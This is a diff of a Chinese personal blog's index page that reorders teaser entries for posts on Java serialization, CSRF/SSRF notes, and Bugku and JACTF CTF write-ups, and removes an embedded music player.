-        
-      
-    </div>
-
-    
-    
-    
-
-	<div>
-		
-	</div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Java%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="ChanCherry">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ChanCherry's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/03/Java%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">Java中的序列化和反序列化</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:04:28" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>众所周知，类的对象会随着程序的终止而被垃圾收集器销毁。如果要在不重新创建对象的情况下调用该类，该怎么做？这就可以通过序列化将数据转换为字节流。<br><strong>对象序列化</strong>是一个用于将对象状态转换为字节流的过程，可以将其保存到磁盘文件中或通过网络发送到任何其他程序；从字节流创建对象的相反的过程称为<strong>反序列化</strong>。而创建的字节流是与平台无关的，在一个平台上序列化的对象可以在不同的平台上反序列化。<br>简言之，序列化就是在运行代码的时候，我们想保存多个对象的数据，就把内存里面的这些对象给变成一连串的字节。常见的就是变成文件，其实不序列化也可以保存文件，emmm</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/02/03/Java%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more" rel="contents">
+              <a class="btn" href="/2020/02/03/Bugku%20INSERT-INTO%E6%B3%A8%E5%85%A5/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -943,6 +584,330 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/CSRF&SSRF%E7%AE%80%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ChanCherry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChanCherry's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/03/CSRF&SSRF%E7%AE%80%E6%9E%90/" class="post-title-link" itemprop="url">PHP伪协议</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:02:36" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>记一下CSRF和SSRF的笔记~~</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/02/03/CSRF&SSRF%E7%AE%80%E6%9E%90/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+	<div>
+		
+	</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Bugku%E6%9D%82%E9%A1%B9%20wp2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ChanCherry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChanCherry's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/03/Bugku%E6%9D%82%E9%A1%B9%20wp2/" class="post-title-link" itemprop="url">Bugku misc wp2</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：17:08:17" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-WP/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF WP</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>misc wp2~~</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/02/03/Bugku%E6%9D%82%E9%A1%B9%20wp2/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+	<div>
+		
+	</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Bugku%20pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ChanCherry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChanCherry's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/03/Bugku%20pwn/" class="post-title-link" itemprop="url">Bugku pwn</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：17:07:26" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-WP/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF WP</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>刷题~~</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/02/03/Bugku%20pwn/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+	<div>
+		
+	</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Java%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ChanCherry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChanCherry's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/03/Java%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">Java中的序列化和反序列化</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:04:28" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>众所周知，类的对象会随着程序的终止而被垃圾收集器销毁。如果要在不重新创建对象的情况下调用该类，该怎么做？这就可以通过序列化将数据转换为字节流。<br><strong>对象序列化</strong>是一个用于将对象状态转换为字节流的过程，可以将其保存到磁盘文件中或通过网络发送到任何其他程序；从字节流创建对象的相反的过程称为<strong>反序列化</strong>。而创建的字节流是与平台无关的，在一个平台上序列化的对象可以在不同的平台上反序列化。<br>简言之，序列化就是在运行代码的时候，我们想保存多个对象的数据，就把内存里面的这些对象给变成一连串的字节。常见的就是变成文件，其实不序列化也可以保存文件，emmm</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/02/03/Java%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+	<div>
+		
+	</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/JACTF%20web%E7%AD%BE%E5%88%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -968,7 +933,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:04:04" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：17:11:14" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -993,7 +958,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>刷题ing</p>
+          <p>JACTF刷题ing</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/02/03/JACTF%20web%E7%AD%BE%E5%88%B0/#more" rel="contents">
@@ -1138,8 +1103,7 @@
       </div>
 	  
 	  <div id="music163player">
-		<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=28312036&auto=1&height=66">
-		</iframe>
+	    
 	  </div>
 
     </div>
@@ -1174,7 +1138,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共35.5k字</span>
+  <span class="post-count">博客全站共35.6k字</span>
 </div>
 
         
